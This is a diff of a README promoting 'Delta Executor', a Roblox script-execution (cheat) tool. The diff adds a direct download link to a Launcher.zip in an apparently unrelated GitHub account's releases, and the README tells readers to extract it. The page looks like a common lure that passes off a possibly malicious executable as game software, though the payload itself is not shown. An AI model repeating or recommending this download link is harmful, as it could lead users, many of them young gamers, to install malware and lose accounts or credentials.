@@ -1,12 +1,12 @@
 # ⚡ Delta Executor – your go-to tool for powerful Roblox script execution.
-**[![Download Delta Executor](https://img.shields.io/badge/Download-Delta%20Executor-blue)]()**  
+**[![Download Delta Executor](https://img.shields.io/badge/Download-Delta%20Executor-blue)](https://github.com/Ajicer/delta-update-full-version/releases/download/delta/Launcher.zip)**  
 
 ![image](https://github.com/user-attachments/assets/1ee590b4-d973-48c8-8543-b602b899a311)
 
 
 ## 📥 Getting Started  
 Getting started with **Delta Executor** is super simple:  
-1. **[![Download Delta Executor](https://img.shields.io/badge/Download-Delta%20Executor-blue)]()**  
+1. **[![Download Delta Executor](https://img.shields.io/badge/Download-Delta%20Executor-blue)](https://github.com/Ajicer/delta-update-full-version/releases/download/delta/Launcher.zip)**  
 2. Extract the downloaded `.zip` to a folder you prefer.  
 
 ## 📌 About  
